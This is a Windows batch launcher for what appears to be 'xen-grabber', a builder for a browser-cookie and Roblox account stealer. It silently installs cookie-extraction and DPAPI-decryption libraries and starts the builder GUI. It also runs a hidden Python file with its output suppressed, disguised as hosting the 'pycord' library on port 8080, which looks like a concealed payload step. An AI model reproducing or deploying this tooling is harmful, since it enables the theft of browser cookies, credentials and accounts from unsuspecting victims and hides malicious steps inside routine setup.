@echo off
cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    goto ERROR
)

title Checking libraries...
echo Checking main libraries... (1/6)
pip show requests robloxpy browser_cookie3 pycord > nul 2>&1
if %errorlevel% neq 0 (
    title Installing main libraries...
    pip install requests robloxpy browser_cookie3 pycord > nul
)

title Checking libraries...
echo Checking 'customtkinter' (2/6)
pip show customtkinter > nul 2>&1
if %errorlevel% neq 0 (
    title Installing customtkinter...
    pip install customtkinter > nul
)

echo Checking 'pillow' (3/6)
pip show pillow > nul 2>&1
if %errorlevel% neq 0 (
    title Installing pillow...
    pip install pillow > nul
)

echo Checking 'urllib3' (4/6)
pip show urllib3 > nul 2>&1
if %errorlevel% neq 0 (
    title Installing urllib3...
    pip install urllib3 > nul
)

echo Checking 'dpapi' (5/6)
pip show dpapi > nul 2>&1
if %errorlevel% neq 0 (
    title Installing dpapi...
    pip install dpapi > nul
)

echo Checking 'pyaesm' (6/6)
pip show pyaesm > nul 2>&1
if %errorlevel% neq 0 (
    title Installing pyaesm...
    pip install pyaesm > nul
)

cls
title Hosting locally...
timeout /t 5 > nul
echo Running pycord at port 8080...
python Components/pycord/bin/hosthttp.py > nul 2>&1
if %errorlevel% neq 0 (
    title Error...
    cls
    color 4
    echo Failed to host pycord due to missing/corrupt files! Please download the repository again from https://github.com/xen-light/xen-grabber
    pause > nul
    exit
)

cls
title Starting builder...
python gui.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4 && title [Error]
pause > nul
